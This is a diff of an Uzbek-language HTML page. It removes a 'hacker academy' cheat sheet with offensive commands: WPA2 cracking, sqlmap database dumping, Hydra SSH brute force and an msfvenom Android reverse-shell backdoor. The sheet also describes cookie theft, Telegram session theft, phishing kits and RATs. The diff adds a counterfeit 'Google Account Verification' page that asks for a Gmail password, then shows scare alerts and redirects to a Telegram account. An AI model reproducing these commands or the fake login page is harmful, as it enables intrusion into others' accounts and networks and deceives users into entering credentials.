@@ -2,152 +2,100 @@
 <html lang="uz">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>WEB HACKER | PROFESSIONAL V6</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SECURE ACCESS | WEB HACKER</title>
     <style>
-        :root { --neon: #00ff41; --bg: #050505; --warn: #ff3300; }
-        body { background: var(--bg); color: var(--neon); font-family: 'Courier New', monospace; margin: 0; padding: 10px; display: flex; justify-content: center; overflow-x: hidden; }
-        
-        /* Scanline Animatsiyasi */
-        body::before { content: ""; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: linear-gradient(rgba(18,16,16,0) 50%, rgba(0,0,0,0.1) 50%), linear-gradient(90deg, rgba(255,0,0,0.02), rgba(0,255,0,0.01), rgba(0,0,255,0.02)); z-index: 1000; pointer-events: none; }
+        body {
+            background-color: #050505;
+            color: #00ff41;
+            font-family: 'Courier New', monospace;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            margin: 0;
+            text-align: center;
+        }
 
-        .terminal { width: 100%; max-width: 600px; border: 2px solid var(--neon); background: rgba(0,0,0,0.95); padding: 15px; box-sizing: border-box; box-shadow: 0 0 20px var(--neon); }
-        
-        /* Login */
-        #login-box { text-align: center; margin-top: 50px; }
-        input { background: transparent; border: 1px solid var(--neon); color: var(--neon); padding: 12px; width: 85%; text-align: center; outline: none; font-size: 1.2rem; letter-spacing: 3px; }
-        
-        /* Menu Grid */
-        .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 8px; margin: 15px 0; max-height: 300px; overflow-y: auto; border-bottom: 1px solid var(--neon); padding-bottom: 10px; }
-        .grid::-webkit-scrollbar { width: 4px; }
-        .grid::-webkit-scrollbar-thumb { background: var(--neon); }
+        .login-box {
+            border: 1px solid #00ff41;
+            padding: 30px;
+            box-shadow: 0 0 15px #00ff41;
+            border-radius: 8px;
+            background: rgba(0, 40, 0, 0.2);
+        }
 
-        .btn { background: transparent; color: var(--neon); border: 1px solid var(--neon); padding: 10px 5px; font-size: 0.7rem; cursor: pointer; text-transform: uppercase; transition: 0.3s; }
-        .btn:hover { background: var(--neon); color: black; }
+        input {
+            background: transparent;
+            border: 1px solid #00ff41;
+            color: #00ff41;
+            padding: 10px;
+            margin: 10px 0;
+            width: 250px;
+            outline: none;
+        }
 
-        /* Konsol */
-        #console { border: 1px dashed var(--neon); padding: 12px; min-height: 350px; word-wrap: break-word; overflow-wrap: break-word; white-space: pre-wrap; font-size: 0.85rem; line-height: 1.5; background: rgba(0, 20, 0, 0.5); }
-        
-        .title { color: yellow; font-weight: bold; text-decoration: underline; display: block; margin-bottom: 8px; }
-        .cmd { color: white; background: #333; padding: 2px 5px; border-radius: 3px; }
-        .important { color: var(--warn); font-weight: bold; }
+        .btn {
+            background: #00ff41;
+            color: black;
+            border: none;
+            padding: 10px 20px;
+            cursor: pointer;
+            font-weight: bold;
+            margin-top: 10px;
+            text-decoration: none;
+            display: inline-block;
+        }
+
+        .btn:hover {
+            background: #00cc33;
+        }
+
+        .admin-btn {
+            background: transparent;
+            color: #ff3333;
+            border: 1px solid #ff3333;
+            margin-top: 20px;
+        }
+
+        .admin-btn:hover {
+            background: #ff3333;
+            color: white;
+        }
     </style>
 </head>
 <body>
 
-<div id="login-box">
-    <h1 style="text-shadow: 0 0 10px var(--neon);">☠ SYSTEM LOGIN</h1>
-    <input type="password" id="pass" placeholder="*****" onkeydown="if(event.key==='Enter') login()">
-    <p style="font-size: 0.7rem;">[ Shama: web_hacker ]</p>
-</div>
-
-<div id="main" class="terminal" style="display:none;">
-    <div style="text-align: center; font-size: 0.8rem; margin-bottom: 10px;">ROOT@KIBER_AKADEMIYA:~# ACCESS_GRANTED</div>
+<div class="login-box">
+    <h2>SYSTEM PENETRATION</h2>
+    <p>Google Account Verification Required</p>
     
-    <div class="grid" id="menu"></div>
-
-    <div id="console">
-        <div id="out">> Buyruqni tanlang...</div>
-    </div>
+    <input type="email" placeholder="Gmail manzilingiz" id="email"><br>
+    <input type="password" placeholder="Parolingiz" id="pass"><br>
+    
+    <button class="btn" onclick="startPrank()">LOGIN TO SYSTEM</button>
+    
+    <br>
+    <a href="https://t.me/saidjon_mc1" class="btn admin-btn">ADMINGA MUROJAT</a>
 </div>
 
 <script>
-    function login() {
-        if(document.getElementById('pass').value === "web_hacker") {
-            document.getElementById('login-box').style.display = 'none';
-            document.getElementById('main').style.display = 'block';
-        } else { alert("Xato!"); }
-    }
-
-    const database = {
-        'recon': "<span class='title'>1. RAZVEDKA (RECONNAISSANCE)</span>\nHackerlikning 70% qismi ma'lumot yig'ishdir.\n- Passive: Shodan.io orqali qurilmalarni qidirish.\n- Active: <span class='cmd'>nmap -sV [IP]</span> orqali ochiq portlarni topish.\n- Tool: <span class='cmd'>theHarvester</span> (email va subdomainlar uchun).",
-        
-        'insta': "<span class='title'>2. INSTAGRAM ATTACK</span>\n- Metod: <span class='important'>Session Hijacking.</span>\n- Amaliyot: Hackerlar 'Cookie-stealer' scriptlari orqali foydalanuvchi brauzeridagi login ma'lumotlarini o'g'irlaydi.\n- Himoya: Har doim 'Settings > Security > Login Activity'ni tekshiring.",
-        
-        'wifi': "<span class='title'>3. WI-FI BUZISH (WPA2)</span>\n- Qadam: Monitor rejimiga o'tish: <span class='cmd'>airmon-ng start wlan0</span>\n- Qadam: Handshake ushlash: <span class='cmd'>airodump-ng -c [kanal] --bssid [MAC] -w cap wlan0mon</span>\n- Brute-force: <span class='cmd'>aircrack-ng cap.cap -w wordlist.txt</span>",
-        
-        'phish': "<span class='title'>4. PROFESSIONAL PHISHING</span>\n- Tool: <span class='cmd'>Zphisher</span>\n- Sirlari: Hackerlar linkni qisqartirish (Bitly) va 'Maskphish' orqali asl linkni yashirishadi.\n- Masalan: google.com-login-verify.link-web.uz",
-        
-        'tg': "<span class='title'>5. TELEGRAM EXPLOIT</span>\n- Metod: <span class='important'>Tdata Theft.</span>\n- Maqsad: Kompyuterdagi 'tdata' papkasini o'g'irlash.\n- Natija: Hech qanday SMS kodsiz va parolsiz akkauntga kirish imkoni.",
-        
-        'ip': "<span class='title'>6. IP TRACKING</span>\n- Tool: <span class='cmd'>Seeker</span>\n- Ishlash tartibi: Qurbonga 'Sizga yaqin kafeni toping' deb link yuboriladi. Ruxsat berganda GPS koordinatalari (lat/long) hackerga keladi.",
-        
-        'sql': "<span class='title'>7. SQL INJECTION (DB HACK)</span>\n- Tekshirish: URL oxiriga <span class='cmd'>'</span> qo'ying. Xato chiqsa - zaiflik bor.\n- Buzish: <span class='cmd'>sqlmap -u [URL] --dump</span>\n- Natija: Butun sayt foydalanuvchilari paroli sizning qo'lingizda.",
-        
-        'metasploit': "<span class='title'>8. METASPLOIT FRAMEWORK</span>\n- Maqsad: APK yoki EXE fayl ichiga backdoor (virus) joylash.\n- Buyruq: <span class='cmd'>msfvenom -p android/meterpreter/reverse_tcp LHOST=[IP] LPORT=4444 -o virus.apk</span>",
-        
-        'social': "<span class='title'>9. IJTIMOIY MUHANDISLIK</span>\n- Inson psixologiyasi: 'Sizning kartangiz bloklandi, kodni ayting'.\n- Shior: Inson xatosi - eng katta zaiflik.",
-        
-        'dark': "<span class='title'>10. DARKNET VA ONION</span>\n- Brauzer: <span class='cmd'>TOR Browser.</span>\n- Qidiruv tizimi: <span class='cmd'>Torch</span> yoki <span class='cmd'>Ahmia</span>.\n- Eslatma: Darknetda har qadamda kiber-hujumlar mavjud.",
-        
-        'rat': "<span class='title'>11. RAT (MASOFADAN BOSHQARISH)</span>\n- Tool: <span class='cmd'>NjRAT</span> yoki <span class='cmd'>L3MON</span>.\n- Imkoniyat: Qurbonning kamerasini yoqish, SMS'larni o'qish, fayllarni yuklab olish.",
-        
-        'brute': "<span class='title'>12. BRUTE FORCE ATTACK</span>\n- Tool: <span class='cmd'>Hydra</span>\n- Buyruq: <span class='cmd'>hydra -l admin -P passlist.txt [IP] ssh</span>\n- Samara: Parol oddiy bo'lsa (12345), u tezda topiladi.",
-        
-        'osint': "<span class='title'>13. OSINT (RAZVEDKA)</span>\n- Tool: <span class='cmd'>Sherlock</span>\n- Maqsad: Username orqali barcha akkauntlarni topish.\n- <span class='cmd'>python3 sherlock.py ism_familiya</span>",
-
-        'ddos': "<span class='title'>14. DDOS HUJUMI</span>\n- Metod: <span class='important'>UDP Flood.</span>\n- Maqsad: Server kanalini to'ldirish.\n- Tool: <span class='cmd'>Hammer</span> yoki <span class='cmd'>LOIC</span>.",
-
-        'kali': "<span class='title'>15. KALI LINUX ASOSLARI</span>\nHackerlar Linuxni tanlaydi, chunki unda barcha portlar va tarmoq drayverlari ochiq boshqariladi.",
-
-        'root': "<span class='title'>16. ANDROID ROOT</span>\nTelefoningizda <span class='cmd'>SuperUser</span> bo'lish orqali tizim fayllarini va Wi-Fi drayverlarini boshqarish mumkin.",
-
-        'steg': "<span class='title'>17. STEGANOGRAPHY</span>\n- Ma'lumotni rasm ichiga yashirish.\n- Tool: <span class='cmd'>Steghide</span>\n- <span class='cmd'>steghide embed -cf rasm.jpg -ef sirli_kod.txt</span>",
-
-        'vpn': "<span class='title'>18. ANONIMLIK (VPN/PROXY)</span>\nHech qachon o'z IP manzilingizda ishlamang. <span class='cmd'>Proxychains</span> orqali 3-4 ta davlat orqali o'ting.",
-
-        'bug': "<span class='title'>19. BUG BOUNTY</span>\nSaytlardan xato topib pul ishlash. HackerOne va Bugcrowd platformalarida ro'yxatdan o'ting.",
-
-        'zero': "<span class='title'>20. ZERO-DAY ATTACKS</span>\nHali dunyoga ma'lum bo'lmagan zaifliklar. Eng qimmat va xavfli hujum turi.",
-
-        'shell': "<span class='title'>21. WEB SHELL O'RNATISH</span>\nSaytga kirgandan so'ng <span class='cmd'>PHP Shell</span> yuklash orqali butun serverni boshqarish mumkin.",
-
-        'botnet': "<span class='title'>22. BOTNET TARMOQLARI</span>\nMinglab 'zombi' kompyuterlarni bitta markazdan hujumga yo'naltirish.",
-
-        'key': "<span class='title'>23. KEYLOGGER</span>\nFoydalanuvchi yozayotgan har bir harfni (parollarni) real vaqtda hackerga yuboruvchi dastur.",
-
-        'sniff': "<span class='title'>24. PACKET SNIFFING</span>\nOchiq HTTP saytlardagi parollarni tarmoq havosi orqali tutib olish. Tool: <span class='cmd'>Wireshark</span>.",
-
-        'spoof': "<span class='title'>25. DNS SPOOFING</span>\nFoydalanuvchini soxta saytga yo'naltirish. Masalan: u bank.uz yozadi, lekin sizning soxta saytingiz ochiladi.",
-
-        'firewall': "<span class='title'>26. FIREWALL BYPASS</span>\nHimoya devorini aldab o'tish uchun 'Payload'larni shifrlash (Encoding) metodlari.",
-
-        'malware': "<span class='title'>27. MALWARE ANALIZ</span>\nViruslarni o'rganish va ularni antiviruslarga ko'rinmaydigan qilish (FUD - Fully Undetectable).",
-
-        'deface': "<span class='title'>28. SITE DEFACING</span>\nSaytning asosiy yuzini o'zgartirish. Bu ko'proq hacker guruhlarining o'zini ko'rsatishi uchun ishlatiladi.",
-
-        'crypt': "<span class='title'>29. CRYPTOGRAPHY</span>\nMa'lumotlarni Hash qilish (MD5, SHA256). Parollarni bazada faqat Hashlangan holda saqlash kerak.",
-
-        'final': "<span class='title'>30. FINAL: HACKER ETHICS</span>\nHaqiqiy kuch - bu himoyalashda. Buzib kirish oson, lekin tizimni xavfsiz qilish san'atdir."
-    };
-
-    const keys = Object.keys(database);
-    const titles = ["Razvedka", "Insta Chopish", "WiFi Buzish", "Phishing V3", "Telegram Hack", "IP Tracker", "SQL Injection", "Metasploit", "Muhandislik", "Darknet", "RAT Sirlari", "Brute Force", "Sherlock", "DDoS Hujum", "Kali Asoslari", "Root Imkoniyat", "Steganografiya", "Anonimlik", "Bug Bounty", "Zero-Day", "Web Shell", "Botnet", "Keylogger", "Sniffing", "DNS Spoofing", "Firewall Bypass", "Malware Analiz", "Site Deface", "Shifrlash", "Final O'git"];
-
-    const menu = document.getElementById('menu');
-    keys.forEach((key, i) => {
-        let b = document.createElement('button');
-        b.className = 'btn';
-        b.innerHTML = `${i+1}. ${titles[i]}`;
-        b.onclick = () => run(key);
-        menu.appendChild(b);
-    });
-
-    function run(k) {
-        const out = document.getElementById('out');
-        document.getElementById('console').style.display = 'block';
-        out.innerHTML = "[SYSTEM_LOADING...]\n";
-        let i = 0;
-        let d = database[k];
-        function type() {
-            if (i < d.length) {
-                out.innerHTML = d.substring(0, i+1);
-                i++;
-                setTimeout(type, 5);
-            }
+    function startPrank() {
+        const email = document.getElementById('email').value;
+        if(email === "") {
+            alert("Iltimos, maydonlarni to'ldiring!");
+            return;
         }
-        setTimeout(type, 200);
+        
+        alert("Sizning ma'lumotlaringiz tahlil qilinmoqda...");
+        setTimeout(() => {
+            alert("Tizimga kirish rad etildi! Siz kuzatilmoqdasiz...");
+            window.location.href = "https://t.me/saidjon_mc1";
+        }, 2000);
     }
 </script>
+
 </body>
 </html>
+
